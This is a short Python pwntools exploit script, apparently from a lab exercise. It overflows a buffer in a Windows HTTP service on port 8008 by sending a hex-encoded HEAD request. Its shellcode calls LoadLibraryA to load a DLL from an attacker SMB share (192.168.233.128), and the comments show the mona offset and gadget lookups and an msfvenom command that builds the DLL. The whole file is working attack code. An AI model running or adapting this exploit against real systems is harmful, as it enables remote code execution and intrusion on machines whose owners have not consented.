#!/usr/bin/python3
from pwn import remote, p32, asm

"""
HMODULE LoadLibraryA(
  [in] LPCSTR lpLibFileName
);
"""

dll  = b""
dll += asm("mov ebx, esp")                    # save the smb string in $ebx
dll += asm("push ebx")                        # push ptr to the string
dll += asm("mov eax, dword ptr [0x625070c8]") # save LoadLibraryA() in $eax
dll += asm("call eax")                        # call $eax with the smb string as argument

# !py mona pattern_offset eip
offset = 36
junk = b"A" * (offset - len(dll))

# !py mona jmp -r eax -m bheadsvr.dll
jmpeax = p32(0x625012f2)

# msfvenom -p windows/exec CMD=calc.exe -f dll -o shell.dll
smb = b"\\\\192.168.233.128\\kali\\shell.dll"

payload = dll + junk + jmpeax + smb

content = f"HEAD /{payload.hex()} HTTP/1.1".encode()

shell = remote("Windows", 8008)

shell.sendline(content)
